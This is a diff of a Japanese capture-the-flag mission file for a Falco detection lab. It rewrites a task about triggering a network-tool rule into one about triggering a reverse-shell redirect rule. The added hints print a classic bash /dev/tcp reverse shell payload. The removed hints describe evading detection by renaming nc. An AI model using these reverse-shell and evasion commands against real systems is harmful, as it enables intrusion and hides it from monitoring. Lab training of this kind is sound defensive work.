@@ -1,72 +1,85 @@
 ┌──────────────────────────────────────────────────────────────────┐
 │ Operation NimbusBreach · Mission 08 — C2 Beacon                  │
 │ Type: TRIGGER · 難易度: ★★★★☆                                    │
-│ 目標 Falco ルール: "Launch Suspicious Network Tool in Container"  │
+│ 目標 Falco ルール: "Redirect STDOUT/STDIN to Network Connection"  │
 └──────────────────────────────────────────────────────────────────┘
 
 # シナリオ
 
 backdoor は仕込んだ (Mission 07)。だが「あとで再アクセス」のための
-**outbound C2 接続**も貼っておきたい。さっそく nc で「外」と話そう…
-だが NimbusCorp は Falco でこれも見ている。
+**reverse shell** を貼っておきたい。古典 reverse shell payload は
+**network socket fd を stdout / stderr に dup する** ことで、
+attacker server 側のターミナルにシェルを生やす。
+NimbusCorp の Falco は、まさにこの **dup 操作** を見ている。
 
 # ゴール
 
-このコンテナで Falco ルール「Launch Suspicious Network Tool in
-Container」を発火させる。発火 = solve。
+このコンテナで Falco ルール「Redirect STDOUT/STDIN to Network
+Connection in Container」を発火させる。発火 = solve。
 
 # 背景
 
-このルールは `proc.name` ベース。**`nc` / `ncat` / `socat` / `nmap` /
-`tcpdump` / `tshark` / `wireshark`** 等、**コンテナで普通使わない
-ネットワークツール** が exec された瞬間に発火する。
+reverse shell の最小 payload (Bash 版):
 
-**実通信の成否は問わない** — exec しただけで発火 (`proc.name` 判定)。
-NetworkPolicy で outbound が block されていても、ツール起動自体が
-検知対象。
+  bash -i >& /dev/tcp/<attacker>/<port> 0>&1
+
+ここでやっている事:
+  1. `/dev/tcp/<host>/<port>` — bash builtin で TCP socket を open
+  2. `>&` で stdout/stderr をその socket fd に **dup2**
+  3. shell の interactive モード起動
+
+Falco rule は 2 番目の **dup2 (= dup syscall + dst fd ∈ {0,1,2})** が
+**ipv4/ipv6 socket fd を対象に行われたら** alert する。
 
 # 試すこと
 
-  nc -zv 8.8.8.8 53
+接続先は実在する outbound 可能なサーバ (DNS の 53/tcp は受ける):
 
-通信は失敗 (NetworkPolicy で block) しても、`nc` が exec された
-時点でルールは発火する。
+  bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'
+
+bash の `<>` は:
+  - `connect(socket, "8.8.8.8:53")`
+  - `dup2(socketfd, 1)`  ← Falco 発火
+
+接続が成立しなくても、bash が dup2 する瞬間にルールは発火する
+場合がある。確実に発火させるには接続成立が必要。
 
 # クリア条件
 
-`Launch Suspicious Network Tool in Container` が発火する。
+`Redirect STDOUT/STDIN to Network Connection in Container` が発火。
 
 # 環境にあるもの
 
   /opt/ctf/fixtures/welcome.txt  ← このファイル
-  (利用可能なツール: nc / curl / wget / dig / nslookup)
 
 ────────────────────────────────────────────────────────────────────
-HINT 1 (易): どのツール
+HINT 1 (易): bash の /dev/tcp
 ────────────────────────────────────────────────────────────────────
 
-`nc` (netcat) が最も簡単。listen 側でも connect 側でもどちらでも OK。
+bash 5.x は **`/dev/tcp/<host>/<port>`** を built-in で扱える。
+fd リダイレクトと組み合わせると 1 行で reverse shell っぽい動作:
 
-  nc -zv 8.8.8.8 53        # connect 試行
-  nc -lp 4444 &            # listen バックグラウンド
+  bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'
 
-────────────────────────────────────────────────────────────────────
-HINT 2 (中): 他のツール
-────────────────────────────────────────────────────────────────────
-
-`ncat` / `socat` / `nmap` も対象。**`curl` は対象外** (普通の HTTP
-クライアントなので suspicious_network_tools に入らない)。
+8.8.8.8:53 は Google Public DNS。TCP 53 を受けてくれる。
 
 ────────────────────────────────────────────────────────────────────
-HINT 3 (回避の発想 — Mission 10 への伏線)
+HINT 2 (中): 古典 reverse shell pattern
 ────────────────────────────────────────────────────────────────────
 
-このルールは **proc.name (basename of exe)** で判定する。
-`/bin/nc` を別名にコピーして実行すれば回避できる:
+  bash -i >& /dev/tcp/8.8.8.8/53 0>&1
 
-  cp /bin/nc /tmp/curlish
-  /tmp/curlish -zv 8.8.8.8 53   # proc.name = "curlish" → 発火しない
+これは PayloadsAllTheThings 等で出てくる典型 reverse shell payload。
+attacker 側で `nc -lp 53` していれば本物のシェルが取れる構造。
 
-これは Mission 10 で「**静かに**外部に話す」ための必須テクニック。
+────────────────────────────────────────────────────────────────────
+HINT 3 (Mission 10 への伏線)
+────────────────────────────────────────────────────────────────────
+
+このルールは **dup syscall + socket fd** を見る。回避には:
+  - そもそも dup2 を使わない (`curl` で済ます)
+  - socket を作らない (file 経由でやり取り)
+
+Mission 10 では reverse shell を使わずに目的達成する。
 
 参考: REFERENCE.md §3.6
